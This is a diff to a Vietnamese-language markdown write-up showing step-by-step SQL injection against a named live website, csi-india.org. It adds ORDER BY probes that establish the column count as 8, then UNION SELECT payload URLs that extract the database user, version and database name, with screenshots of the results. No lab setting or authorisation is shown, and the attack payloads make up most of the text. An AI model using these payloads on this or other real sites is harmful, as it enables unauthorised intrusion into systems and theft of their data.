@@ -13,21 +13,38 @@ Kiểm tra trên web "Computer Society of India" `https://csi-india.org/news/ind
 
 ## Dò tìm số cột
 
+`https://csi-india.org/news/index.php?id=18+ORDER+BY+1`
+
 ![image](https://github.com/user-attachments/assets/1db5d0ae-72f2-432c-abeb-fb572dd2c1ea)
+
+=> Số cột lớn hơn 1
+
+`https://csi-india.org/news/index.php?id=18+ORDER+BY+10`
 
 ![image](https://github.com/user-attachments/assets/84374454-20c5-4db2-a2c6-23d905c49bcf)
 
+=> Số cột bé hơn 10
+
+`https://csi-india.org/news/index.php?id=18+ORDER+BY+8`
+
 ![image](https://github.com/user-attachments/assets/cccfee89-cf9f-4c3a-be8a-fc30af8329e1)
 
+=> Số cột là 8    
 ## Kiểm tra database, version, user 
+
+**1. User**
 
 `https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,user(),5,6,7,8`
 
 ![image](https://github.com/user-attachments/assets/75227e5b-953a-48dd-a56a-c49d4b1b8725)
 
+**2. Version**
+
 https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,version(),5,6,7,8
 
 ![image](https://github.com/user-attachments/assets/e623bf1a-727f-4a23-b0a4-2b80b280a6cb)
+
+**3. Database**
 
 https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,database(),5,6,7,8
 
